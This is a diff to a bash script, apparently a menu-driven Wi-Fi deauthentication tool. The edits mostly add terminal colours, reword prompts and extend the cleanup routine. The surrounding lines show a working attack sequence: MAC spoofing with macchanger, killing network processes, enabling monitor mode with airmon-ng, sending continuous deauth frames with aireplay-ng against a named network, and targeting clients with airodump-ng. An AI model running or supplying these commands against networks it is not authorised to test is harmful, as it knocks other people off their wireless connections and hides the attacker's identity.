@@ -104,10 +104,10 @@ function update(){
 				echo "LETS GO AND DEAUTH ALL"
 			elif [ $menuSelection -eq 1 ]
 			then
-				echo "deauth network"
+				 echo -e "\e[36mlets deauth a network"
 clear
 iwconfig
-echo -e "type your wireless card name:"
+echo -e "\e[31mtype your wireless card name:\e[36m"
 read wire
 ifconfig $wire down
 macchanger -r $wire
@@ -118,9 +118,9 @@ clear
 echo "it is now scanning networks so this takes a little bit"
 sleep 5
 iw dev $wire scan | egrep "SSID|primary channel"
-echo -e "type the name of the network:"
+echo -e "\e[31mtype the name of the network:\e[36m"
 read name
-echo -e "and the channel:"
+echo -e "\e[31mand the channel:\e[36m"
 read channel
 airmon-ng start $wire
 airmon-ng check kill
@@ -144,8 +144,9 @@ xterm -e "aireplay-ng -0 0 -e '$name' $wire""mon; read"
 				echo "deauth target"
 
 clear
+echo -e "\e[36m "
 iwconfig
-echo -e "type your wireless card name:"
+echo -e "\e[31mtype your wireless card name:\e[36m"
 read wire
 ifconfig $wire down
 macchanger -r $wire
@@ -156,9 +157,9 @@ clear
 echo "it is now scanning networks so this takes a little bit"
 sleep 5
 iw dev $wire scan | egrep "SSID|primary channel"
-echo -e "type the name of the network:"
+echo -e "\e[31mtype the name of the network:\e[36m"
 read name
-echo -e "and the channel:"
+echo -e "\e[31mand the channel:\e[36m"
 read channel
 airmon-ng start $wire
 airmon-ng check kill
@@ -167,10 +168,8 @@ clear
 gnome-terminal -x sh -c "airodump-ng --essid '$name' -c $channel $wire""mon" 
 				
 
-		
-		echo "would you like to look up a mac adress?"
-		echo " "
-		PS3="Enter your choice: "
+		echo "\e[31m  "
+		PS3="Would you like to lookup a mac adress (1 or 2) "
 		options=("yes" "no")
 		select opt in "${options[@]}"
 		do
@@ -213,6 +212,8 @@ gnome-terminal -x sh -c "airodump-ng --essid '$name' -c $channel $wire""mon"
 function cleanup(){
 	echo -e "\e[0mCleaning"
 	printf "\e]0;Terminal\007"
+airmon-ng stop $wire"mon"
+ifconfig $wire up
 	reset
 	exit 255
 }
